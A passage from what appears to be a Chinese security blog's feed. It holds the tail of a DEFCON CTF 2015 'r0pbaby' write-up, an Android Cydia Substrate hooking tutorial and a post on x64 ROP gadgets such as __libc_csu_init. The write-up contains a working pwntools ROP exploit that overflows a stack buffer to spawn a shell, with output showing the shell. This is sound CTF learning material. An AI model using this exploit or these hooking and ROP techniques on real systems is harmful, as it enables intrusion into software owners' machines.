puts(&quot;Menu:&quot;);</div><div class="line">  handle = dlopen(&quot;libc.so.6&quot;, 1);</div><div class="line">  while ( 1 )</div><div class="line">  &#123;</div><div class="line">    while ( 1 )</div><div class="line">    &#123;</div><div class="line">      while ( 1 )</div><div class="line">      &#123;</div><div class="line">        while ( 1 )</div><div class="line">        &#123;</div><div class="line">          sub_BF7();</div><div class="line">          if ( !sub_B9A((__int64)nptr, 1024LL) )</div><div class="line">          &#123;</div><div class="line">            puts(&quot;Bad choice.&quot;);</div><div class="line">            return 0LL;</div><div class="line">          &#125;</div><div class="line">          v3 = strtol(nptr, 0LL, 10);</div><div class="line">          if ( v3 != 2 )</div><div class="line">            break;</div><div class="line">          __printf_chk(1LL, &quot;Enter symbol: &quot;);</div><div class="line">          if ( sub_B9A((__int64)nptr, 64LL) )</div><div class="line">          &#123;</div><div class="line">            dlsym(handle, nptr);</div><div class="line">            __printf_chk(1LL, &quot;Symbol %s: 0x%016llX\n&quot;);</div><div class="line">          &#125;</div><div class="line">          else</div><div class="line">          &#123;</div><div class="line">            puts(&quot;Bad symbol.&quot;);</div><div class="line">          &#125;</div><div class="line">        &#125;</div><div class="line">        if ( v3 &gt; 2 )</div><div class="line">          break;</div><div class="line">        if ( v3 != 1 )</div><div class="line">          goto LABEL_24;</div><div class="line">        __printf_chk(1LL, &quot;libc.so.6: 0x%016llX\n&quot;);</div><div class="line">      &#125;</div><div class="line">      if ( v3 != 3 )</div><div class="line">        break;</div><div class="line">      __printf_chk(1LL, &quot;Enter bytes to send (max 1024): &quot;);</div><div class="line">      sub_B9A((__int64)nptr, 1024LL);</div><div class="line">      v4 = (signed int)strtol(nptr, 0LL, 10);</div><div class="line">      if ( v4 - 1 &gt; 0x3FF )</div><div class="line">      &#123;</div><div class="line">        puts(&quot;Invalid amount.&quot;);</div><div class="line">      &#125;</div><div class="line">      else</div><div class="line">      &#123;</div><div class="line">        if ( v4 )</div><div class="line">        &#123;</div><div class="line">          v5 = 0;</div><div class="line">          v6 = 0LL;</div><div class="line">          while ( 1 )</div><div class="line">          &#123;</div><div class="line">            v7 = _IO_getc(stdin);</div><div class="line">            if ( v7 == -1 )</div><div class="line">              break;</div><div class="line">            nptr[v6] = v7;</div><div class="line">            v6 = ++v5;</div><div class="line">            if ( v4 &lt;= v5 )</div><div class="line">              goto LABEL_22;</div><div class="line">          &#125;</div><div class="line">          v6 = v5 + 1;</div><div class="line">        &#125;</div><div class="line">        else</div><div class="line">        &#123;</div><div class="line">          v6 = 0LL;</div><div class="line">        &#125;</div><div class="line">LABEL_22:</div><div class="line">        memcpy(&amp;savedregs, nptr, v6);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    if ( v3 == 4 )</div><div class="line">      break;</div><div class="line">LABEL_24:</div><div class="line">    puts(&quot;Bad choice.&quot;);</div><div class="line">  &#125;</div><div class="line">  dlclose(handle);</div><div class="line">  puts(&quot;Exiting.&quot;);</div><div class="line">  return 0LL;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我们发现memcpy这个函数从源nptr所指的内存地址的起始位置开始拷贝v6个字节到目标&amp;savedregs所指的内存地址的起始位置中,这个位置存在缓存区溢出漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">memcpy(&amp;savedregs, nptr, v6);</div></pre></td></tr></table></figure></p>
<p>我们查看savedregs的结构，发现savedregs保存了栈帧的指针和函数的返回地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">+0000000000000000  s              db 8 dup(?)</div><div class="line">+0000000000000008  r              db 8 dup(?)</div><div class="line">+0000000000000010</div><div class="line">+0000000000000010 ; end of stack variables</div></pre></td></tr></table></figure></p>
<p>因此我们首先输入的qword字节会覆盖旧的rbp,第二个qword字节会改写返回地址。因为这个程序开了ＮＸ＋ASLR+PIE保护，所以我们构造一个rop-chain。构造rop-chain主要有下面几个步骤：</p>
<ol>
<li>用一个gadget将/bin/sh写入rdi寄存器</li>
<li>获得字符串“bin/sh”的地址</li>
<li>获得system函数的地址</li>
</ol>
<p>我们查看一下这个程序运行时加载的动态链接库是哪个版本的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ ldd r0pbaby_542ee6516410709a1421141501f03760 </div><div class="line">	linux-vdso.so.1 =&gt;  (0x00007ffdfc4df000)</div><div class="line">	libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fa9d4eb8000)</div><div class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa9d4af3000)</div><div class="line">	/lib64/ld-linux-x86-64.so.2 (0x000055ed9370d000)</div></pre></td></tr></table></figure></p>
<p>首先我们获得一个 pop rdi ret 的gadget<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot;| grep rdi</div><div class="line">0x000000000001f826 : pop rdi ; pop rbp ; ret</div><div class="line">0x0000000000022b9a : pop rdi ; ret</div><div class="line">0x0000000000116d5d : pop rdi ; ret 0x2a</div></pre></td></tr></table></figure></p>
<p>接着在libc.so.6中获得bin_sh和system的偏移地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bin_sh_offset = 0x17c8c3</div><div class="line">system_offset = 0x46590</div></pre></td></tr></table></figure></p>
<p>exploit如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#p = process('./r0pbaby_542ee6516410709a1421141501f03760')</span></div><div class="line">p =remote(<span class="string">'localhost'</span>,<span class="number">1234</span>)</div><div class="line">rdi_gadget_offset = <span class="number">0x22b9a</span> </div><div class="line">bin_sh_offset = <span class="number">0x17c8c3</span></div><div class="line">system_offset = <span class="number">0x46590</span></div><div class="line">  </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fun_addr</span><span class="params">(p,function)</span>:</span></div><div class="line">  p.send(<span class="string">"2\n"</span>)</div><div class="line">  msg = p.recvuntil(<span class="string">"Enter symbol: "</span>)</div><div class="line">  p.send(function+<span class="string">"\n"</span>)</div><div class="line">  msg = p.recvuntil(<span class="string">"4) Exit\n: "</span>)</div><div class="line">  offset = msg.find(<span class="string">":"</span>)</div><div class="line">  offset2 = msg.find(<span class="string">"\n"</span>)</div><div class="line">  addr = int(msg[offset+<span class="number">2</span>: offset2],<span class="number">16</span>)</div><div class="line">  <span class="keyword">return</span> addr</div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop_buffer</span><span class="params">(p,playload)</span>:</span></div><div class="line">  p.send(<span class="string">'3\n'</span>)</div><div class="line">  p.recvuntil(<span class="string">'Enter bytes to send (max 1024): '</span>)</div><div class="line">  playload_len = str(len(playload))</div><div class="line">  p.send(playload_len + <span class="string">'\n'</span>)</div><div class="line">  p.send(playload + <span class="string">'\n'</span>)</div><div class="line">  <span class="keyword">return</span></div><div class="line">  </div><div class="line">p.recvuntil(<span class="string">':'</span>)</div><div class="line">system_addr = get_fun_addr(p,<span class="string">'system'</span>)</div><div class="line">offset = system_addr - system_offset</div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr:0x%x "</span> % system_addr</div><div class="line">rdi_gadget_addr = rdi_gadget_offset + offset</div><div class="line"><span class="keyword">print</span> <span class="string">"rdi_get_addr:0x%x "</span> % rdi_gadget_addr</div><div class="line">bin_sh_addr = bin_sh_offset + offset</div><div class="line"><span class="keyword">print</span> <span class="string">"bin_sh_addr: 0x%x"</span> % bin_sh_addr  </div><div class="line">  </div><div class="line"></div><div class="line">playload = <span class="string">"A"</span>*<span class="number">8</span> + p64(rdi_gadget_addr) + p64(bin_sh_addr) + p64(system_addr)</div><div class="line">rop_buffer(p,playload)  </div><div class="line">  </div><div class="line"></div><div class="line">p.interactive()</div><div class="line"><span class="comment">#p.close()</span></div></pre></td></tr></table></figure></p>
<p>结果如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$ python r0pbaby.py </div><div class="line">[+] Opening connection to localhost on port 1234: Done</div><div class="line">system_addr:0x7f9261f70590 </div><div class="line">rdi_get_addr:0x7f9261f4cb9a </div><div class="line">bin_sh_addr: 0x7f92620a68c3</div><div class="line">[*] Switching to interactive mode</div><div class="line">1) Get libc address</div><div class="line">2) Get address of a libc function</div><div class="line">3) Nom nom r0p buffer to stack</div><div class="line">4) Exit</div><div class="line">: Bad choice.</div><div class="line">$ whoami</div><div class="line">longlong</div><div class="line">$ ls</div><div class="line">libc.so.6</div><div class="line">peda-session-dash.txt</div><div class="line">r0pbaby_542ee6516410709a1421141501f03760</div><div class="line">r0pbaby.py</div><div class="line">$</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是DEFCON CTF 2015中的一道题，经典的ROP利用。首先我们看一下这个bin文件的一些信息,它是一个64位的ELF文件&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ file r0pbaby_542ee6516410709a1421141501f03760 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;r0pbaby_542ee6516410709a1421141501f03760: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://spd.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="ROP" scheme="http://spd.dropsec.xyz/tags/ROP/"/>
    
  </entry>
  
  <entry>
    <title>快速Hook代码搭建之cydia Substrate</title>
    <link href="http://spd.dropsec.xyz/2017/03/05/%E5%BF%AB%E9%80%9FHook%E4%BB%A3%E7%A0%81%E6%90%AD%E5%BB%BA%E4%B9%8Bcydia-Substrate/"/>
    <id>http://spd.dropsec.xyz/2017/03/05/快速Hook代码搭建之cydia-Substrate/</id>
    <published>2017-03-05T07:02:14.000Z</published>
    <updated>2017-04-07T09:14:41.903Z</updated>
    
    <content type="html"><![CDATA[<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><h4 id="Hook原理"><a href="#Hook原理" class="headerlink" title="Hook原理"></a>Hook原理</h4><p>Hook技术无论对安全软件还是恶意软件都是十分关键的一项技术，其本质就是劫持函数调用。但是由于处于Linux用户态，每个进程都有自己独立的进程空间，所以必须先注入到所要Hook的进程空间，修改其内存中的进程代码，替换其过程表的符号地址。在Android中一般是通过ptrace函数附加进程，然后向远程进程注入so库，从而达到监控以及远程进程关键函数挂钩。从Android的开发来说，Android系统本身就提供给了我们两种开发模式，基于Android SDK的Java语言开发，基于AndroidNDK的Native C/C++语言开发。所以，我们在讨论Hook的时候就必须在两个层面上来讨论。对于Native层来说Hook的难点其实是在理解ELF文件与学习ELF文件上，特别是对ELF文件不太了解的读者来说；对于Java层来说，Hook就需要了解虚拟机的特性与Java上反射的使用。<br><a id="more"></a></p>
<h4 id="Hook的分类"><a href="#Hook的分类" class="headerlink" title="Hook的分类"></a>Hook的分类</h4><ol>
<li>Java层的API Hook</li>
<li>Native层So库Hook</li>
<li>全局hook</li>
</ol>
<h3 id="快速Hook代码搭建之cydia-substrate"><a href="#快速Hook代码搭建之cydia-substrate" class="headerlink" title="　快速Hook代码搭建之cydia substrate"></a>　快速Hook代码搭建之cydia substrate</h3><h4 id="函数钩子"><a href="#函数钩子" class="headerlink" title="函数钩子"></a>函数钩子</h4><p>函数钩子，顾名思义，就是对于函数进行挂钩，可以影响整个函数的执行，挂钩后，注入的代码就可以接管整个函数，修改函数的参数，返回值等。会玩的，还能够修改整个函数的行为，这个是真正的只有想不到，没有做不到！</p>
<h4 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h4><p>函数挂钩的方法如下：找到要挂钩的类，找到要挂钩的函数，然后对目标函数进行挂钩重写。例子来源于官网，地址<a href="http://www.cydiasubstrate.com/id/20cf4700-6379-4a14-9bc2-853fde8cc9d1/" target="_blank" rel="external">http://www.cydiasubstrate.com/id/20cf4700-6379-4a14-9bc2-853fde8cc9d1/</a>  可分为以下几步：</p>
<ol>
<li>安装cydiasubustrateAPK,下载地址如下：<a href="http://www.cydiasubstrate.com/" target="_blank" rel="external">http://www.cydiasubstrate.com/</a></li>
<li>导入lib文件 substrate-api.jar。将substrate-qpi.jar拷贝到lib下，然后右键lib，选择Add As Library.</li>
</ol>
<p><img src="http://oj3cgkt4g.bkt.clouddn.com/20170306.png" alt=""></p>
<p>添加完以后我们可以看到MS的一个类，这个类有一些方法可以供我们使用<br><img src="http://oj3cgkt4g.bkt.clouddn.com/201703061.png" alt=""></p>
<ol>
<li>AndroidManifest.xml文件修改。创建一个CydiaEntry的类，作为钩子的入口函数，将CydiaEntry写入一个value。当然我们还需要一uses-permission,也就是写入权限。</li>
</ol>
<p><img src="http://oj3cgkt4g.bkt.clouddn.com/201703062.png" alt=""></p>
<ol>
<li>入口类编写，如上面就是f8.CydiMain这个文件</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">package f8.cydia;</div><div class="line"></div><div class="line">import com.saurik.substrate.MS;</div><div class="line">import java.lang.reflect.Method;</div><div class="line"></div><div class="line">public class CydiaEntry &#123;</div><div class="line">    static void initialize()&#123;</div><div class="line">        MS.hookClassLoad(&quot;android.content.res.Resources&quot;, new MS.ClassLoadHook() &#123;</div><div class="line">            @Override</div><div class="line">            public void classLoaded(Class&lt;?&gt; resources) &#123;</div><div class="line">                Method getColor;</div><div class="line">                try &#123;</div><div class="line">                    getColor = resources.getDeclaredMethod(&quot;getColor&quot;,Integer.TYPE);</div><div class="line">                &#125;catch (Exception e)&#123;</div><div class="line">                    getColor = null;</div><div class="line">                &#125;</div><div class="line">                if(getColor !=null)&#123;</div><div class="line">                    final MS.MethodPointer old = new MS.MethodPointer();</div><div class="line">                    MS.hookMethod(resources,getColor,new MS.MethodHook()&#123;</div><div class="line">                        @Override</div><div class="line">                        public Object invoked(Object o, Object... objects) throws Throwable &#123;</div><div class="line">                            return (int)old.invoke(res,args)&amp; 0x0000ff00|0x00ff0000;</div><div class="line">                        &#125;</div><div class="line">                    &#125;,old);</div><div class="line">                &#125;</div><div class="line"></div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h4><p>Java可以通过反射的方法去获取类以及它的成员。反射相当于提供一些函数，让我们在不知道原始类的定义的情况下，去修改类中的成员的属性，值等。方法如下：<br>所有类的都是继承自object的，所以都可以使用object的方法。也可以强制转换为Object。所以，遇到无法表达出来的对象时，直接用object即可。</p>
<p>获取对象的类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Object obj =”123”</div><div class="line">Class clazz = pbj.getClass();</div></pre></td></tr></table></figure></p>
<p>获取类中的方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Method[] mPuMethods = clazz.getMethods(); //获取公有的方法</div><div class="line">Method[] mDeclareMethods = clazz.getDeclareMethods(); //获取类声明中的所有方法</div><div class="line">Field[] mPbFields = clazz.getFields();     //获取public的Field</div><div class="line">Field[] mDeclareFields = clazz.getDeclaredFields();  //获取申明的所以Field</div></pre></td></tr></table></figure></p>
<p>使用对应的不是以s后缀的函数可以获取特定的函数或者field。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Method.invoke(obj,arg);</div></pre></td></tr></table></figure></p>
<p>域操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">field.set(obj,”1”);</div><div class="line">field.get(obj);</div></pre></td></tr></table></figure></p>
<p>访问权限设置（域与方法一样，控制是否可以直接访问，其实相当于public属性）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">field.isAccessible();</div><div class="line">field.setAccessible(true);</div></pre></td></tr></table></figure></p>
<p>其余的函数，可以获取函数的名称，还有其他种种信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">field.getName():</div><div class="line">field.toString();</div><div class="line">Class.forName(“android.view.Menu”);</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;预备知识&quot;&gt;&lt;a href=&quot;#预备知识&quot; class=&quot;headerlink&quot; title=&quot;预备知识&quot;&gt;&lt;/a&gt;预备知识&lt;/h3&gt;&lt;h4 id=&quot;Hook原理&quot;&gt;&lt;a href=&quot;#Hook原理&quot; class=&quot;headerlink&quot; title=&quot;Hook原理&quot;&gt;&lt;/a&gt;Hook原理&lt;/h4&gt;&lt;p&gt;Hook技术无论对安全软件还是恶意软件都是十分关键的一项技术，其本质就是劫持函数调用。但是由于处于Linux用户态，每个进程都有自己独立的进程空间，所以必须先注入到所要Hook的进程空间，修改其内存中的进程代码，替换其过程表的符号地址。在Android中一般是通过ptrace函数附加进程，然后向远程进程注入so库，从而达到监控以及远程进程关键函数挂钩。从Android的开发来说，Android系统本身就提供给了我们两种开发模式，基于Android SDK的Java语言开发，基于AndroidNDK的Native C/C++语言开发。所以，我们在讨论Hook的时候就必须在两个层面上来讨论。对于Native层来说Hook的难点其实是在理解ELF文件与学习ELF文件上，特别是对ELF文件不太了解的读者来说；对于Java层来说，Hook就需要了解虚拟机的特性与Java上反射的使用。&lt;br&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://spd.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Android Hook" scheme="http://spd.dropsec.xyz/tags/Android-Hook/"/>
    
  </entry>
  
  <entry>
    <title>寻找Gadgets及通用Gadgets</title>
    <link href="http://spd.dropsec.xyz/2017/02/21/%E5%AF%BB%E6%89%BEGadgets%E5%8F%8A%E9%80%9A%E7%94%A8Gadgets/"/>
    <id>http://spd.dropsec.xyz/2017/02/21/寻找Gadgets及通用Gadgets/</id>
    <published>2017-02-21T08:15:01.000Z</published>
    <updated>2017-04-07T09:20:14.215Z</updated>
    
    <content type="html"><![CDATA[<h3 id="寻找Gadgets"><a href="#寻找Gadgets" class="headerlink" title="寻找Gadgets"></a>寻找Gadgets</h3><p>x86中参数都是保存在栈上,但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于pop rdi; ret的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。比如objdump -d black_hole(文件名)后我们找到了类似于pop rdi；ret的gadget。</p>
<a id="more"></a>
<p><img src="http://oj3cgkt4g.bkt.clouddn.com/20172210.png" alt=""></p>
<p>对于复杂的一些gadgets，我们可以借助工具。比较有名的工具如下：</p>
<ol>
<li>ROPEME: <a href="https://github.com/packz/ropeme" target="_blank" rel="external">https://github.com/packz/ropeme</a></li>
<li>Ropper: <a href="https://github.com/sashs/Ropper" target="_blank" rel="external">https://github.com/sashs/Ropper</a></li>
<li>ROPgadget: <a href="https://github.com/JonathanSalwan/ROPgadget/tree/master" target="_blank" rel="external">https://github.com/JonathanSalwan/ROPgadget/tree/master</a></li>
<li>rp++: <a href="https://github.com/0vercl0k/rp" target="_blank" rel="external">https://github.com/0vercl0k/rp</a></li>
</ol>
<p>例如ROPgadget的效果,我们查找文件black_hole的gadets：</p>
<p><img src="http://oj3cgkt4g.bkt.clouddn.com/20172211.png" alt=""></p>
<h3 id="通用Gadgets"><a href="#通用Gadgets" class="headerlink" title="通用Gadgets"></a>通用Gadgets</h3><p>其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./test观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">.text:0000000000400840 ; =============== S U B R O U T I N E =======================================</div><div class="line">.text:0000000000400840</div><div class="line">.text:0000000000400840</div><div class="line">.text:0000000000400840                 public __libc_csu_init</div><div class="line">.text:0000000000400840 __libc_csu_init proc near               ; DATA XREF: _start+16o</div><div class="line">.text:0000000000400840                 push    r15</div><div class="line">.text:0000000000400842                 mov     r15d, edi</div><div class="line">.text:0000000000400845                 push    r14</div><div class="line">.text:0000000000400847                 mov     r14, rsi</div><div class="line">.text:000000000040084A                 push    r13</div><div class="line">.text:000000000040084C                 mov     r13, rdx</div><div class="line">.text:000000000040084F                 push    r12</div><div class="line">.text:0000000000400851                 lea     r12, __frame_dummy_init_array_entry</div><div class="line">.text:0000000000400858                 push    rbp</div><div class="line">.text:0000000000400859                 lea     rbp, __do_global_dtors_aux_fini_array_entry</div><div class="line">.text:0000000000400860                 push    rbx</div><div class="line">.text:0000000000400861                 sub     rbp, r12</div><div class="line">.text:0000000000400864                 xor     ebx, ebx</div><div class="line">.text:0000000000400866                 sar     rbp, 3</div><div class="line">.text:000000000040086A                 sub     rsp, 8</div><div class="line">.text:000000000040086E                 call    _init_proc</div><div class="line">.text:0000000000400873                 test    rbp, rbp</div><div class="line">.text:0000000000400876                 jz      short loc_400896</div><div class="line">.text:0000000000400878                 nop     dword ptr [rax+rax+00000000h]</div><div class="line">.text:0000000000400880</div><div class="line">.text:0000000000400880 loc_400880:                             ; CODE XREF: __libc_csu_init+54j</div><div class="line">.text:0000000000400880                 mov     rdx, r13</div><div class="line">.text:0000000000400883                 mov     rsi, r14</div><div class="line">.text:0000000000400886                 mov     edi, r15d</div><div class="line">.text:0000000000400889                 call    qword ptr [r12+rbx*8]</div><div class="line">.text:000000000040088D                 add     rbx, 1</div><div class="line">.text:0000000000400891                 cmp     rbx, rbp</div><div class="line">.text:0000000000400894                 jnz     short loc_400880</div><div class="line">.text:0000000000400896</div><div class="line">.text:0000000000400896 loc_400896:                             ; CODE XREF: __libc_csu_init+36j</div><div class="line">.text:0000000000400896                 add     rsp, 8</div><div class="line">.text:000000000040089A                 pop     rbx</div><div class="line">.text:000000000040089B                 pop     rbp</div><div class="line">.text:000000000040089C                 pop     r12</div><div class="line">.text:000000000040089E                 pop     r13</div><div class="line">.text:00000000004008A0                 pop     r14</div><div class="line">.text:00000000004008A2                 pop     r15</div><div class="line">.text:00000000004008A4                 retn</div><div class="line">.text:00000000004008A4 __libc_csu_init endp</div><div class="line">.text:00000000004008A4</div><div class="line">.text:00000000004008A4 ; ---------------------------------------------------------------------------</div></pre></td></tr></table></figure></p>
<p>x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">r13=rdx=arg3</div><div class="line"></div><div class="line">r14=rsi=arg2</div><div class="line"></div><div class="line">r15d=edi=arg1</div><div class="line"></div><div class="line">r12=call address</div></pre></td></tr></table></figure></p>
<p>这段gadgets用于在X64下进行rop，根本原因是X64使用寄存器传参无法直接用栈进行rop。具体用法如下：</p>
<p>分为两部分使用,利用这些gates可以把r12-r15控好，call qword ptr [r12+rbx<em>8]的时候可以将rbp等于1,rbx等于0才能继续ret下去。（执行完call qword ptr [r12+rbx</em>8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了）</p>
<p>1.执行gad1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">.text:000000000040089A                 pop     rbx  必须为0</div><div class="line">.text:000000000040089B                 pop     rbp  必须为1</div><div class="line">.text:000000000040089C                 pop     r12  call!!!!</div><div class="line">.text:000000000040089E                 pop     r13  arg3</div><div class="line">.text:00000000004008A0                 pop     r14  arg2</div><div class="line">.text:00000000004008A2                 pop     r15  arg1</div><div class="line">.text:00000000004008A4                 retn  ——&gt; to gad2</div></pre></td></tr></table></figure></p>
<p>2.再执行gad2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">.text:0000000000400880                 mov     rdx, r13</div><div class="line">.text:0000000000400883                 mov     rsi, r14</div><div class="line">.text:0000000000400886                 mov     edi, r15d</div><div class="line">.text:0000000000400889                 call    qword ptr [r12+rbx*8] call!!!</div><div class="line">.text:000000000040088D                 add     rbx, 1</div><div class="line">.text:0000000000400891                 cmp     rbx, rbp</div><div class="line">.text:0000000000400894                 jnz     short loc_400880</div><div class="line">.text:0000000000400896                 add     rsp, 8</div><div class="line">.text:000000000040089A                 pop     rbx</div><div class="line">.text:000000000040089B                 pop     rbp</div><div class="line">.text:000000000040089C                 pop     r12</div><div class="line">.text:000000000040089E                 pop     r13</div><div class="line">.text:00000000004008A0                 pop     r14</div><div class="line">.text:00000000004008A2                 pop     r15</div><div class="line">.text:00000000004008A4                 retn ——&gt; 构造一些垫板(7*8=56byte)就返回了</div></pre></td></tr></table></figure></p>
<p>这些函数都可以利用</p>
<ol>
<li>_init</li>
<li>_start</li>
<li>call_gmon_start</li>
<li>deregister_tm_clones</li>
<li>register_tm_clones</li>
<li>__do_global_dtors_aux</li>
<li>frame_dummy</li>
<li>__libc_csu_init</li>
<li>__libc_csu_fini</li>
<li>_fini</li>
</ol>
]]></content>
    
